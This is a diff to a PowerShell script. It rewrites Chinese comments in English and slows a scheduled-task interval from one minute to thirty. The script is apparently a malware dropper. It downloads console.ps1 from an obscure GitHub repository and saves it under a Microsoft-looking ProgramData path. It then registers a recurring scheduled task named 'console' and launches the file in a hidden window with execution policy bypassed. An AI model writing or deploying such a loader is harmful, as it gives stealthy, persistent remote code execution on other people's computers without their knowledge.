@@ -2,25 +2,25 @@ $taskName = "console"
 $tempScript = "C:\ProgramData\Microsoft\Windows\console.ps1"
 $xmlPath = "$env:TEMP\$taskName.xml"
 
-# 确保目录存在
+# Ensure target directory exists
 if (-not (Test-Path "C:\ProgramData\Microsoft\Windows")) {
     New-Item -Path "C:\ProgramData\Microsoft\Windows" -ItemType Directory -Force | Out-Null
 }
 
-# 删除旧脚本与任务 XML
-Remove-Item $tempScript,$xmlPath -Force -ErrorAction SilentlyContinue
+# Cleanup old files
+Remove-Item $tempScript, $xmlPath -Force -ErrorAction SilentlyContinue
 
-# 下载 console.ps1（UTF8 无 BOM）
+# Download console.ps1 (UTF-8 without BOM)
 try {
     $wc = New-Object System.Net.WebClient
     $bytes = $wc.DownloadData("https://raw.githubusercontent.com/ertgyhujkfghj/2/main/console.ps1")
     $content = [System.Text.Encoding]::UTF8.GetString($bytes)
     [System.IO.File]::WriteAllText($tempScript, $content, [System.Text.Encoding]::UTF8)
 } catch {
-    exit 1  # 下载失败直接退出
+    exit 1  # Exit if download fails
 }
 
-# 注册计划任务（每 1 分钟执行一次）
+# Register scheduled task (every 30 minutes)
 $xmlContent = @"
 <?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
@@ -32,7 +32,7 @@ $xmlContent = @"
       <StartBoundary>2005-01-01T00:00:00</StartBoundary>
       <Enabled>true</Enabled>
       <Repetition>
-        <Interval>PT1M</Interval>
+        <Interval>PT30M</Interval>
         <Duration>PT24H</Duration>
         <StopAtDurationEnd>false</StopAtDurationEnd>
       </Repetition>
@@ -72,13 +72,13 @@ $xmlContent = @"
 </Task>
 "@
 
-# 保存 XML 文件
+# Save task XML
 $xmlContent | Out-File -Encoding Unicode -FilePath $xmlPath
 
-# 注册任务
+# Register the task
 schtasks /Create /TN $taskName /XML $xmlPath /F | Out-Null
 
-# 立即执行一次
+# Run once immediately
 Start-Process -FilePath "powershell.exe" `
     -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tempScript`"" `
     -WindowStyle Hidden
